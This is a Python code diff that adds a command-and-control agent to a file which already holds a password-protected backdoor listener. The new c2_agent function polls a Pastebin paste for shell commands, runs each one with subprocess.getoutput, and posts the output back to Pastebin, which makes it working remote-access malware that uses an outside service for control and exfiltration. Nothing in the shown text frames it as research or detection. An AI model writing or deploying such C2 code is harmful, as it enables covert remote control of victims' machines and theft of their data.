@@ -102,3 +102,40 @@ def backdoor_listener(port, backdoor_password):
         client_socket, addr = server.accept()
         logging.info(f"Connection from {addr}")
         threading.Thread(target=handle_client, args=(client_socket, backdoor_password)).start()
+
+def c2_agent(c2_url, sleep_interval=60):
+    """
+    The main loop for the C2 agent. It polls a URL for commands.
+    """
+    from modules.c2 import get_from_pastebin, post_to_pastebin
+
+    paste_id = c2_url.split('/')[-1]
+    logging.info(f"C2 agent started. Polling Pastebin ID: {paste_id}")
+
+    while True:
+        try:
+            command = get_from_pastebin(paste_id)
+            if command and command.strip() != "waiting...":
+                logging.info(f"Received command: {command}")
+
+                # Execute the command
+                output = subprocess.getoutput(command)
+
+                # Post the output back to a new paste
+                response_title = f"Output for command: {command[:20]}"
+                response_url = post_to_pastebin(response_title, output)
+
+                if response_url:
+                    # Clear the command paste by overwriting it
+                    # (This is a simplified approach)
+                    post_to_pastebin(f"Command executed. Output at {response_url}", "waiting...")
+                else:
+                    logging.error("Failed to post command output.")
+
+            else:
+                logging.info("No new command found. Sleeping.")
+
+        except Exception as e:
+            logging.error(f"Error in C2 agent loop: {e}")
+
+        time.sleep(sleep_interval)
